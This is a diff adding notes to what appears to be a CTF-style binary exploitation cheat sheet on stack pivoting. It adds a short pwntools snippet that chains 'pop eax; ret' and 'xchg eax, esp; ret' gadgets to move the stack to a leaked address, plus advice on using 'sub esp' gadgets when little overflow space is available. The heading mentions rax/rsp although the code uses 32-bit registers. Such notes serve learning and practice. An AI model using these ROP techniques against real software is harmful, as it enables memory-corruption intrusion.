@@ -165,3 +165,28 @@ rop.raw([
     leave_ret,
 ])
 ```
+
+### Example "xchg rax, rsp; ret;" Payload
+
+Using a simple `xchg` instruction where we control the register that is exchanged with esp.  
+*This doesn't cover finding a new stack location*  
+
+```python
+from pwn import *
+
+xchg = p32(0x0804882e) # 0x0804882e: xchg eax, esp; ret;
+pop = p32(0x0804882c) # 0x0804882c: pop eax; ret;
+
+payload = flat([
+  pop,
+  leaked_addr,
+  xchg
+])
+```
+
+### Example "sub esp, 0x20"
+
+If you don't have much space for a rop chain, eg. only 4 or 8 bytes are overflowed out of the buffer,  
+you can utilise a `sub esp, 0x20`, or similar to move the stack pointer lower in memory,  
+where you have additional ROP gadgets.  
+Use ROP gadgets in your offset data rather than just junk alone.  
